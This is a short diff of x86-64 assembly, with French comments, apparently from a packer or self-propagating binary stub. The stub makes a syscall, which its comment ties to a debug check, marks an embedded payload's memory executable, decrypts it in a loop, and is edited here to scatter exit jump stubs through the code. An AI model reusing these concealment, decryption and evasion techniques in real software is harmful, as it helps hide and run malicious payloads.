@@ -33,10 +33,22 @@ syscalls:
 after_entry_1:
 ;
 	syscall ; syscalls
+;
+	jmp after_exit_5
+	jmp5:
+		jmp -1 ; sortie
+after_exit_5:
+;
 	cmp eax, 0 ; syscalls
 	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
     mov rdx, 0x7 ;EXEC | READ ; syscalls
-    mov rsi, 0x2883;|REPLACE1| size payload + 1 page ; syscalls
+    mov rsi, 0x296f;|REPLACE1| size payload + 1 page ; syscalls
+;
+	jmp after_exit_2
+	jmp2:
+		jmp -1 ; sortie
+after_exit_2:
+;
 	lea rdi, [$ + 0x10000000] ; adresse du payload ; syscalls
 	mov rbx, rdi ; syscalls
 	and rdi, 0xFFFFFFFFFFFFF000 ; syscalls
@@ -90,8 +102,20 @@ ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x1883;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x196f;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
+;
+	jmp after_exit_3
+;
+	jmp after_exit_4
+	jmp4:
+		jmp -1 ; sortie
+after_exit_4:
+;
+	jmp3:
+		jmp -1 ; sortie
+after_exit_3:
+;
 	shl eax, 2 ; dechiffrement & chiffrement
 	mov ecx, eax ; dechiffrement & chiffrement
 ;
@@ -162,18 +186,25 @@ after_entry_3:
 	cmp DWORD [rsp - 8], 4 ; sortie
 	je jmp2 ; sortie
 	cmp DWORD [rsp - 8], 3 ; sortie
+;
+	jmp after_exit_1
+	jmp1:
+		jmp -1 ; sortie
+after_exit_1:
+;
 	je jmp3 ; sortie
 	cmp DWORD [rsp - 8], 2 ; sortie
 	je jmp4 ; sortie
 	cmp DWORD [rsp - 8], 1 ; sortie
 	je jmp5 ; sortie
-jmp1:
-	jmp -1 ; sortie
-jmp2:
-	jmp -1 ; sortie
-jmp3:
-	jmp -1 ; sortie
-jmp4:
-	jmp -1 ; sortie
-jmp5:
-	jmp -1 ; sortie
+last_instr_of_end:
+;jmp1:
+;	jmp -1 ; sortie
+;jmp2:
+;	jmp -1 ; sortie
+;jmp3:
+;	jmp -1 ; sortie
+;jmp4:
+;	jmp -1 ; sortie
+;jmp5:
+;	jmp -1 ; sortie
